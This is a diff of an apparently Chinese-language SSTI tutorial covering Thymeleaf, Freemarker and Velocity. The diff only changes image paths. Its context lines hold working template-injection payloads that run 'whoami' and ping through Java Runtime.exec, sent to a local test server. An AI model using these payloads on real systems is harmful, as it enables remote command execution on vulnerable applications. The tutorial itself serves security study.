@@ -388,7 +388,7 @@ Content-Length: 24
 path=aaa__${7*7}__bbb::x
 ```
 
-![pasted image 20260618084238](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084238.png)
+![pasted image 20260618084238](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084238.png)
 
 
 
@@ -403,7 +403,7 @@ Content-Length: 24
 path=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::x
 ```
 
-![pasted image 20260618084243](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084243.png)
+![pasted image 20260618084243](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084243.png)
 
 #### 5.4.4.2 test2路由
 
@@ -421,9 +421,9 @@ section=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("ping -
 // -c与-n，-c是linux的命令，-n是Windows的命令
 ```
 
-![pasted image 20260618084251](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084251.png)
+![pasted image 20260618084251](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084251.png)
 
-![pasted image 20260618084255](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084255.png)
+![pasted image 20260618084255](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084255.png)
 
 #### 5.4.4.3 test3路由
 
@@ -436,9 +436,9 @@ Connection: close
 
 ```
 
-![pasted image 20260618084300](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084300.png)
+![pasted image 20260618084300](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084300.png)
 
-![pasted image 20260618084305](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084305.png)
+![pasted image 20260618084305](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084305.png)
 
 #### 5.4.4.4 test4路由
 
@@ -453,10 +453,10 @@ Content-Length: 110
 data=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::x
 ```
 
-![pasted image 20260618084315](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084315.png)
+![pasted image 20260618084315](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084315.png)
 
 #### 5.4.4.5 test5路由
-![pasted image 20260618084321](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084321.png)
+![pasted image 20260618084321](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084321.png)
 
 
 
@@ -472,7 +472,7 @@ Content-Length: 119
 data=<h3 th:text="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()}"></h3>
 ```
 
-![pasted image 20260618084327](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084327.png)
+![pasted image 20260618084327](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084327.png)
 
 
 
@@ -483,7 +483,7 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-![pasted image 20260618084337](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084337.png)
+![pasted image 20260618084337](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084337.png)
 
 ## 5.5 Freemarker
 ### 5.5.1 常用POC
@@ -603,7 +603,7 @@ public class FreeMarkerTest {
 ```
 
 ### 5.5.3 漏洞测试
-![pasted image 20260618084355](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084355.png)
+![pasted image 20260618084355](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084355.png)
 
 
 ```
@@ -626,9 +626,9 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-![pasted image 20260618084408](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084408.png)
+![pasted image 20260618084408](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084408.png)
 
-![pasted image 20260618084414](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084414.png)
+![pasted image 20260618084414](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084414.png)
 
 
 
@@ -651,9 +651,9 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-![pasted image 20260618084426](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084426.png)
+![pasted image 20260618084426](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084426.png)
 
-![pasted image 20260618084432](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084432.png)
+![pasted image 20260618084432](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084432.png)
 
 ## 5.6 Velocity
 ### 5.5.1 常用POC
@@ -759,7 +759,7 @@ public class VelocityTest {
 ```
 
 ### 5.6.3 漏洞测试
-![pasted image 20260618084444](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084444.png)
+![pasted image 20260618084444](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084444.png)
 
 
 
@@ -783,9 +783,9 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-![pasted image 20260618084451](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084451.png)
+![pasted image 20260618084451](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084451.png)
 
-![pasted image 20260618084455](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084455.png)
+![pasted image 20260618084455](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084455.png)
 
 
 
@@ -816,9 +816,9 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-![pasted image 20260618084503](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084503.png)
+![pasted image 20260618084503](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084503.png)
 
-![pasted image 20260618084509](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084509.png)
+![pasted image 20260618084509](/assets/img/posts/2026-01-20-ssti-template-injection/pasted-image-20260618084509.png)
 
 ## 6 特别致谢
 ## 6.1 前言
